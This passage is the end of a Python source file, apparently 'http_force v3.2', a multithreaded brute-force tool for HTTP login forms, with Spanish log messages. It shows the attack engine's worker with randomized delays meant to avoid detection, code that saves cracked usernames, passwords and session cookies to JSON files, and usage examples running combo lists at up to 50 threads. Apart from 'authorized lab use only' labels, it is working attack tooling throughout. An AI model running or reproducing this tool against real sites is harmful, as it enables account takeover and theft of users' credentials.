                        executor.shutdown(wait=False, cancel_futures=True)
                        break

                except Exception as e:
                    self.logger.error(f"Error procesando resultado: {e}")

        return first_success

    def _try_with_delay(self, credential: Credential, index: int, total: int) -> AttemptResult:
        """Worker executed by each thread pool thread. Aborts early if stop_attack is set."""
        if self.stop_attack:
            return AttemptResult(
                credential=credential, success=False, status_code=0,
                response_length=0, response_hash="", cookies={},
                elapsed_time=0.0, score=-1, error_message="aborted",
            )

        self.logger.info(f"[{index}/{total}] Probando: {credential}")
        result = self.try_credential(credential)

        delay = (
            get_random_delay(self.statistics.current_delay,
                             self.config.get('delay_randomization', 0.3))
            if self.config.get('randomize_delays', True)
            else self.statistics.current_delay
        )
        time.sleep(delay)
        return result

    def _save_individual_credential(self, result: AttemptResult):
        """Immediately writes a successful credential to its own JSON file."""
        try:
            output_dir = Path('./results/credentials')
            output_dir.mkdir(parents=True, exist_ok=True)
            ts = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_%f')
            path = output_dir / f"cred_{result.credential.username}_{ts}.json"
            data = {
                'credential': str(result.credential),
                'username': result.credential.username,
                'password': result.credential.password,
                'cookies': result.cookies,
                'status_code': result.status_code,
                'response_length': result.response_length,
                'score': result.score,
                'timestamp': result.timestamp.isoformat(),
                'redirect_location': result.redirect_location,
                'elapsed_time': result.elapsed_time,
                'has_mfa': result.has_mfa,
            }
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            self.logger.info(f"[+] Credencial guardada: {path}")
        except Exception as e:
            self.logger.error(f"Error guardando credencial: {e}")

    def save_results(self, result: Optional[AttemptResult], output_dir: Path):
        """Writes final statistics and all found credentials to JSON files."""
        output_dir.mkdir(parents=True, exist_ok=True)
        self.statistics.end_time = datetime.now(timezone.utc)
        ts = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')

        stats_data = self.statistics.to_dict()
        stats_data['found_credentials'] = [str(r.credential) for r in self.found_credentials]
        stats_data['total_found'] = len(self.found_credentials)

        try:
            path = output_dir / f"statistics_{ts}.json"
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(stats_data, f, indent=2, ensure_ascii=False)
            self.logger.info(f"Estadísticas guardadas: {path}")
        except Exception as e:
            self.logger.error(f"Error guardando estadísticas: {e}")

        if self.found_credentials:
            try:
                path = output_dir / f"credentials_{ts}.json"
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump([r.to_dict() for r in self.found_credentials],
                              f, indent=2, ensure_ascii=False)
                self.logger.info(f"Credenciales guardadas: {path}")
            except Exception as e:
                self.logger.error(f"Error guardando credenciales: {e}")

    def cleanup(self):
        self.http_client.close()


def create_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description='http_force v3.2 — HTTP login form brute-forcer (authorized lab use only)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
examples:
  %(prog)s -u http://target/login users.txt passwords.txt
  %(prog)s -u http://target/login users.txt passwords.txt --threads 10
  %(prog)s -u http://target/login users.txt passwords.txt --threads 20 --follow
  %(prog)s -u http://target/login users.txt passwords.txt --delay 3.0 --threads 1
  %(prog)s -u http://target/login combos.txt --combo --threads 50 --delay 0.1

WARNING: authorized environments only.
        ''',
    )
    parser.add_argument('-u', '--url', required=True, help='Login form URL')
    parser.add_argument('file1', help='Users file or combos file')
    parser.add_argument('file2', nargs='?', help='Passwords file')
    parser.add_argument('--combo', action='store_true', help='file1 contains user:pass combos')
    parser.add_argument('--threads', type=int, default=1, help='Concurrent threads (default: 1)')
    parser.add_argument('--follow', action='store_true', help='Continue after first success')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--log', type=Path, help='Log file path')
    parser.add_argument('--config', type=Path, help='JSON config file')
    parser.add_argument('--output-dir', type=Path, default=Path('./results'), help='Results directory')
    parser.add_argument('--delay', type=float, help='Base delay between attempts (seconds)')
    parser.add_argument('--timeout', type=int, help='HTTP timeout (seconds)')
    parser.add_argument('--no-verify-ssl', action='store_true', help='Disable SSL verification')
    return parser


def main():
    parser = create_arg_parser()
    args = parser.parse_args()

    config = load_config(args.config)
    if args.delay is not None:
        config['delay_between_attempts'] = args.delay
    if args.timeout is not None:
        config['timeout'] = args.timeout
    if args.no_verify_ssl:
        config['verify_ssl'] = False

    log_level = LogLevel.DEBUG if args.verbose else LogLevel.INFO
    logger = setup_logger('http_force', log_level, args.log)

    logger.info("=" * 60)
    logger.info(" http_force v3.2")
    logger.info(" Authorized lab use only")
    logger.info("=" * 60)

    if not args.combo and not args.file2:
        logger.error("Standard mode requires two files: users.txt passwords.txt")
        sys.exit(1)

    engine = BruteForceEngine(config, logger)

    try:
        if not engine.initialize_target(args.url):
            logger.error("Fallo al inicializar objetivo")
            sys.exit(1)

        if args.combo:
            credentials = engine.credential_loader.load_combos(Path(args.file1))
        else:
            usernames = engine.credential_loader.load_from_file(Path(args.file1))
            passwords = engine.credential_loader.load_from_file(Path(args.file2))
            credentials = engine.credential_loader.generate_credentials(usernames, passwords)

        logger.info(f"Total de credenciales a probar: {len(credentials)}")

        if args.threads > 1:
            result = engine.run_attack_concurrent(credentials, args.threads, args.follow)
        else:
            result = engine.run_attack_sequential(credentials, args.follow)

        engine.save_results(result, args.output_dir)

        logger.info("=" * 60)
        logger.info("RESUMEN")
        logger.info("=" * 60)
        logger.info(f"Total intentos:       {engine.statistics.total_attempts}")
        logger.info(f"Éxitos:               {engine.statistics.successful_attempts}")
        logger.info(f"Fallos:               {engine.statistics.failed_attempts}")
        logger.info(f"Errores:              {engine.statistics.errors}")
        logger.info(f"Bloqueos detectados:  {engine.statistics.blocked_attempts}")
        logger.info(f"Duración:             {engine.statistics.get_duration():.2f}s")
        logger.info(f"Tasa:                 {engine.statistics.get_rate():.2f} intentos/seg")

        if engine.found_credentials:
            logger.info(f"[*] Total credenciales encontradas: {len(engine.found_credentials)}")
            for r in engine.found_credentials:
                tag = " [2FA]" if r.has_mfa else ""
                logger.info(f"   • {r.credential}{tag}")

        logger.info("=" * 60)
        sys.exit(0 if result and result.success else 1)

    except KeyboardInterrupt:
        logger.warning("\n[!] Interrumpido por el usuario")
        engine.save_results(None, args.output_dir)
        sys.exit(130)

    except Exception as e:
        logger.critical(f"Error fatal: {e}", exc_info=True)
        sys.exit(1)

    finally:
        engine.cleanup()


if __name__ == '__main__':
    main()
